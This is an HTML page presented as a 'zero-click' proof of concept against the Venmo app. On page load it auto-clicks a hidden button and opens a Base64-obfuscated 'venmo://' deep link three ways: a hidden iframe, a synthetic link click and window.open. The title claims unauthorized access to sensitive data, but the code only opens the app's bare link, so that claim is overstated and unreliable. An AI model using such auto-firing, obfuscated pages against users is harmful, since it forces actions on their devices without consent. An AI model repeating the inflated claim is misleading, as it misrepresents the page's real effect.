<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Venmo Zero‑Click PoC – FINAL UPDATE: EXACT METHOD DETERMINED (Zero‑click unauthorized access to sensitive data)</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Additional spoofing headers or meta tags can be added here -->
  </head>
  <body>
    <!-- Hidden trigger element (will be auto‑clicked on DOMContentLoaded) -->
    <button id="trigger" style="display:none;">Trigger Deep Link</button>
    
    <script>
      // Base64 decoding function
      function decodeBase64(str) {
        return decodeURIComponent(
          atob(str)
            .split('')
            .map(function(c) {
              return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
            })
            .join('')
        );
      }
      
      // Base64‑encoded deep link for Venmo ("venmo://")
      var encodedDeepLink = "dmVubW86Ly8=";
      
      // Function to initiate the deep link using multiple mechanisms
      function triggerDeepLink() {
        var deepLink = decodeBase64(encodedDeepLink);
        console.log("Decoded deep link: " + deepLink);
        
        // 1. Create a hidden iframe and set its source to the deep link.
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = deepLink;
        document.body.appendChild(iframe);
        
        // 2. Create a hidden anchor element, set its href, and simulate a click.
        var a = document.createElement('a');
        a.href = deepLink;
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        
        // 3. Additionally, use a window.open call with a minimal delay.
        setTimeout(function() {
          window.open(deepLink, '_self');
        }, 5);
      }
      
      // On DOMContentLoaded, simulate a trusted user gesture.
      document.addEventListener('DOMContentLoaded', function() {
        var btn = document.getElementById('trigger');
        btn.addEventListener('click', triggerDeepLink);
        btn.click();
      });
    </script>
  </body>
</html>
